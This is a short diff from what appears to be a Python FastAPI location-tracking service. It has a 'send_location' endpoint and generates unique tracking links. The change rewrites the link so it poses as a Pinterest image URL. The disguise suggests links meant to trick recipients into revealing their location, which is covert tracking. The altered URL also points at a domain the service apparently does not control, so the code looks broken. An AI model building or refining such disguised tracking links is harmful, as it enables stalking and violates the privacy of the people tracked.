@@ -88,7 +88,7 @@ async def send_location(location: LocationData):
 @app.get("/generate-link/")
 async def generate_link():
     unique_id = str(uuid.uuid4())[:8]
-    tracking_url = f"https://encr.pw/EJch2/track/{unique_id}"
+    tracking_url = f"https://i.pinimg.com/236x/eb/3f/da/eb3fda4cfda1efd0f29d20994af4696e.jpg/track/{unique_id}"
     active_links[unique_id] = {"status": "waiting"}
     return JSONResponse(content={"link": tracking_url})
 
